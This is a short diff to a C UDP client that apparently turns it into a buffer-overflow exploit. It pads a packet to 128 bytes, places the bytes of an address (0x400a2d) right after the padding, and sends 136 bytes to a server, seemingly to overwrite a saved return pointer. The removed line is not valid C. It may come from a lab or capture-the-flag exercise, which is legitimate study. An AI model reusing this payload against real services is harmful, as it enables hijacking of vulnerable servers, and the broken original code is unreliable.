@@ -20,8 +20,8 @@ void error(char *msg) {
     perror(msg);
     exit(0);
 }
+char buffer[400] = {0};
 
-char buffet[] = {aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa2d0a400000000000};
 int main(int argc, char **argv) {
     int sockfd, portno, n;
     int serverlen;
@@ -29,6 +29,11 @@ int main(int argc, char **argv) {
     struct hostent *server;
     char *hostname;
     char buf[BUFSIZE];
+
+    buffer[128] = 0x2d;
+    buffer[129] = 0x0a;
+    buffer[130] = 0x40;
+    
 
     /* check command line arguments */
     if (argc != 3) {
@@ -64,7 +69,7 @@ int main(int argc, char **argv) {
 
     /* send the message to the server */
     serverlen = sizeof(serveraddr);
-    n = sendto(sockfd, buffet, 10, 0, &serveraddr, serverlen);
+    n = sendto(sockfd, buffer, 128+8 , 0, &serveraddr, serverlen);
     if (n < 0) 
       error("ERROR in sendto");
     
